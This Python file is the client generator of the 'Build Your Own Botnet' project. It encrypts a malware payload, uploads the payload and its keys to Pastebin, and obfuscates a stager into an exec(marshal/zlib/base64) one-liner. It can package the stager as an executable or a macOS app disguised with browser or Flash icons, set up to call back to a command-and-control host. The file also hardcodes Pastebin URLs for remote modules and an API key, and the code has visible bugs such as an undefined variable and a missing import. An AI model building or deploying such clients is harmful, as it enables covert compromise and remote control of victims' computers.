#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library
import os
import sys
import json
import zlib
import base64
import urllib
import marshal
import colorama
import argparse
import subprocess

# byob
try:
    from modules import security, util
except:
    from .modules import security, util


colorama.init(autoreset=True)


def exe(options, filename):
    try:
        filename= os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', filename)
        pyname  = os.path.basename(filename)
        name    = os.path.splitext(pyname)[0]
        dist    = os.path.dirname(filename)
        key     = util.variable(16)
        icon    = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
        pkgs    = list(set([i.strip().split()[1] for i in open(filename).read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import'] + [i.strip().split()[1] for i in open('modules/payload.py','r').read().splitlines() if len(i.strip().split()) if i.strip().split()[0] == 'import' if len(str(i.strip().split()[1])) < 35]))
        spec    = open('resources/pyinstaller.spec','r').read().replace('[HIDDEN_IMPORTS]', str(pkgs)).replace('[ICON_PATH]', icon).replace('[PY_FILE]', pyname).replace('[DIST_PATH]', dist).replace('[NAME]', name).replace('[128_BIT_KEY]', key)
        fspec   = os.path.join(dist, name + '.spec')
        with file(fspec, 'w') as fp:
            fp.write(spec)
        make  = subprocess.Popen('%s -m PyInstaller %s' % (sys.executable, fspec), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
        exe   = os.path.join(os.path.join(dist, 'dist'), name + ('.exe' if os.name == 'nt' else ''))
        _  = map(util.delete, (filename, fspec, os.path.join(dist, 'build')))
        return exe
    except Exception as e3:
        util.debug('exe error: {}'.format(str(e3)))


def app(options, filename):
    try:        
        iconFile        = options.icon if os.path.isfile('resources/icon/%s.ico' % options.icon) else None
        version         = '%d.%d.%d' % (random.randint(0,3), random.randint(0,6), random.randint(1, 9))
        baseName        = os.path.basename(filename)
        bundleName      = os.path.splitext(baseName)[0]
        pkgPath         = os.path.join(basePath, 'PkgInfo')
        appPath         = os.path.join(os.getcwd(), '%.app' % bundleName)
        basePath        = os.path.join(appPath, 'Contents')
        distPath 	    = os.path.join(basePath, 'MacOS')
        rsrcPath        = os.path.join(basePath, 'Resources')
        plistPath       = os.path.join(rsrcPath, 'Info.plist')
        iconPath        = os.path.basename(iconFile)
        executable      = os.path.join(distPath, filename)
        bundleVersion   = '%s %s'  % (bundleName, version)
        bundleIdentity  = 'com.%s' % bundleName
        infoPlist       = open('resources/app.plist').read() % (baseName, bundleVersion, iconPath, bundleIdentity, bundleName, bundleVersion, version)
        os.makedirs(distPath)
        os.mkdir(rsrcPath)
        with file(pkgPath, "w") as fp:
            fp.write("APPL????")
        with file(plistPath, "w") as fw:
            fw.write(infoPlist)
        os.rename(filename, os.path.join(distPath, baseName))
        return appPath
    except Exception as e:
        util.debug("app error: {}".format(str(e)))


def py(options, payload='modules/payload.py', stager='modules/stager.py', **kwargs):

        with open(payload, 'r') as fp:
            payload = fp.read()
        color = colorama.Fore.RESET
        name  = 'byob_%s.py' % util.variable(3)
        path  = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name)
        
        if options.name:
            name = options.name
            path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name)
            
        if not path.endswith('.py'):
            path += '.py'

        if options.repo:
            payload = payload.replace('$REPO$', options.repo)
            
        key  = os.urandom(16)
        _key = util.pastebin(base64.b64encode(key))
        payload = payload.replace('$KEY$', _key)
        code = security.encrypt_xor(payload, key, block_size=8, key_size=16, num_rounds=32, padding='\x00')
        diff = round(float(100.0 * float(float(len(code))/float(len(payload)) - 1.0)))
        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Payload encryption complete")
        print(color + colorama.Style.DIM + "    (Plaintext {:,} bytes {} to ciphertext {:,} bytes ({}% {})".format(len(payload), 'increased' if len(code) > len(payload) else 'reduced', len(code), diff, 'larger' if len(code) > len(payload) else 'smaller').ljust(80 - len("[+] ")))
        payload = code
        new_url = util.pastebin(payload)
        api_key = util.pastebin(security.encrypt_xor(kwargs.get('api_key'), base64.b64decode('uuYGm6cUAIwup6kWybUOZw==')))
        xor_key = util.pastebin(security.encrypt_xor(key, base64.b64decode('uuYGm6cUAIwup6kWybUOZw==')))
        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Upload to Pastebin complete")
        print(color + colorama.Style.DIM + "    ({:,} bytes uploaded to: {}".format(len(payload), new_url).ljust(80 - len("[+] ")))
        kwargs.update({"payload": new_url, "xor_key": xor_key, "api_key": api_key})
        with open(stager, 'r') as fp:
            stager = fp.read() + "\nif __name__ == '__main__':\n    _ = main(config={})".format(json.dumps(kwargs))
        code = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
        diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Stager obfuscation and minification complete")
        print(color + colorama.Style.DIM + "    ({:,} bytes {} to {:,} bytes  ({}% {})".format(len(stager), 'increased' if len(code) > len(stager) else 'reduced', len(code), diff, 'larger' if len(code) > len(stager) else 'smaller').ljust(80 - len("[+] ")))
        stager = code
        with file(path, 'w') as fp:
            fp.write(stager)
        print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " +  colorama.Fore.RESET + "Client stager generation complete")
        print(color + colorama.Style.DIM + "    ({:,} bytes written to file: {})".format(len(stager), path).ljust(80 - len("[+] ")))   
        if options.type == 'exe':
            path = exe(options, path)
        elif options.type == 'app':
            path = app(options, path)
        return path

    
def main(*args, **kwargs):
        print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\tClient | Build Your Own Botnet\n")
        parser = argparse.ArgumentParser(prog='client.py', usage='client.py {py,exe,app} host port [options]', description="Client Generator (Build Your Own Botnet)", version='0.4.7')
        parser.add_argument('type', action='store', help='python, executable, app bundle', choices=['py','exe','app'])
        parser.add_argument('host', action='store', type=str, default='localhost', help='server IP')
        parser.add_argument('port', action='store', type=int, default=1337, help='server port')
        parser.add_argument('--repo', action='store', help='base URL for remote imports')
        parser.add_argument('--name', action='store', help='output filename')
        parser.add_argument('--icon', action='store', help='java, flash, chrome, firefox, safari')
        options = parser.parse_args()
        return py(options, **kwargs)

if __name__ == '__main__':
    main(**{"modules": "https://pastebin.com/raw/Z5z5cjny","api_key":"https://pastebin.com/raw/QPAJs08x"})
